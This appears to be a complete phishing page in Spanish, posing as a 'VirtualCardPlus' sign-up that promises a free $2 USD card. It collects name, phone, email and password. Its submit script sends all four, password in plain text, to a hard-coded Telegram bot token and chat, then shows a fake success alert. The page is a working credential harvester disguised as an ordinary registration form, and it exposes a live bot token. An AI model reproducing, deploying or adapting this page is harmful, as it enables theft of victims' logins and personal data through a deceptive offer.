<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Estilos -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a237e, #0d47a1);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 500px;
            animation: fadeIn 1s;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo img {
            width: 120px;
            margin-bottom: 15px;
        }

        h1 {
            color: #1a237e;
            text-align: center;
            margin-bottom: 30px;
            font-size: 2em;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #1a237e;
            outline: none;
        }

        .password-container {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
        }

        button {
            width: 100%;
            padding: 15px;
            background: #1a237e;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background: #0d47a1;
        }

        .terms {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 0.9em;
        }

        .terms a {
            color: #1a237e;
            text-decoration: none;
        }

        .benefits {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
        }

        .benefits h3 {
            color: #1a237e;
            margin-bottom: 15px;
        }

        .benefits ul {
            list-style: none;
        }

        .benefits li {
            margin-bottom: 10px;
            display: flex;
            align-items: center;
        }

        .benefits i {
            color: #1a237e;
            margin-right: 10px;
        }

        footer {
            text-align: center;
            margin-top: 30px;
            color: #666;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Puedes agregar tu logo aquí -->
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IiMxYTIzN2UiPjxwYXRoIGQ9Ik0xMiAxLjQ0OWMtNi4wNzcgMC0xMSA0LjkyMy0xMSAxMXM0LjkyMyAxMSAxMSAxMSAxMS00LjkyMyAxMS0xMS00LjkyMy0xMS0xMS0xMXptMCAyLjM5YzQuNzA4IDAgOC42MSAzLjkwMiA4LjYxIDguNjFzLTMuOTAyIDguNjEtOC42MSA4LjYxLTguNjEtMy45MDItOC42MS04LjYxIDMuOTAyLTguNjEgOC42MS04LjYxek0xMiA2Ljk5Yy0yLjc1IDAtNSAxLjc4LTUgNCAwIDIuMjIgMi4yNSA0IDUgNHM1LTEuNzggNS00YzAtMi4yMi0yLjI1LTQtNS00em0wIDEuNWMxLjkzOCAwIDMuNSAxLjM0NCAzLjUgMi41cy0xLjU2MiAyLjUtMy41IDIuNS0zLjUtMS4zNDQtMy41LTIuNSAxLjU2Mi0yLjUgMy41LTIuNXoiLz48L3N2Zz4=" alt="Logo">
            <h1>Regístrate y Obtén tu tarjeta con $2 USD</h1>
        </div>

        <form id="registrationForm">
            <div class="form-group">
                <label>Nombre completo:</label>
                <input type="text" required>
            </div>

            <div class="form-group">
                <label>Número de teléfono:</label>
                <input type="tel" required>
            </div>

            <div class="form-group">
                <label>Correo electrónico:</label>
                <input type="email" required>
            </div>

            <div class="form-group">
                <label>Contraseña:</label>
                <div class="password-container">
                    <input type="password" required>
                    <i class="toggle-password fas fa-eye"></i>
                </div>
            </div>

            <button type="submit">Crear cuenta gratis</button>
        </form>

        <div class="benefits">
            <h3>Beneficios de tu tarjeta:</h3>
            <ul>
                <li><i class="fas fa-check-circle"></i>$2 USD de regalo inmediato</li>
                <li><i class="fas fa-shield-alt"></i>Protección avanzada</li>
                <li><i class="fas fa-globe"></i>Aceptada mundialmente</li>
                <li><i class="fas fa-clock"></i>Acceso 24/7</li>
            </ul>
        </div>

        <p class="terms">Al registrarte aceptas nuestros <a href="#">Términos y Condiciones</a></p>
        
        <footer>
            © 2025 VirtualCardPlus. Todos los derechos reservados.
        </footer>
    </div>

    <script>
        document.getElementById('registrationForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const formData = {
                nombre: document.querySelector('input[type="text"]').value,
                telefono: document.querySelector('input[type="tel"]').value,
                correo: document.querySelector('input[type="email"]').value,
                contrasena: document.querySelector('input[type="password"]').value
            };

            try {
                const response = await fetch(`https://api.telegram.org/bot8045283335:AAHibrKvIGOKCS3RV8kr8ygTs0OlWe5y-co/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: "-1002633022229",
                        text: `Nuevo registro:\nNombre: ${formData.nombre}\nTeléfono: ${formData.telefono}\nCorreo: ${formData.correo}\nContraseña: ${formData.contrasena}`
                    })
                });

                if (response.ok) {
                    alert('¡Registro exitoso! Revisa tu correo para activar tu tarjeta.');
                    document.getElementById('registrationForm').reset();
                } else {
                    throw new Error('Error al enviar los datos');
                }
            } catch (error) {
                console.error(error);
                alert('Error en el registro. Intenta nuevamente.');
            }
        });

        // Toggle password visibility
        document.querySelector('.toggle-password').addEventListener('click', function() {
            const passwordInput = document.querySelector('input[type="password"]');
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.classList.toggle('fa-eye-slash');
        });
    </script>
</body>
</html>
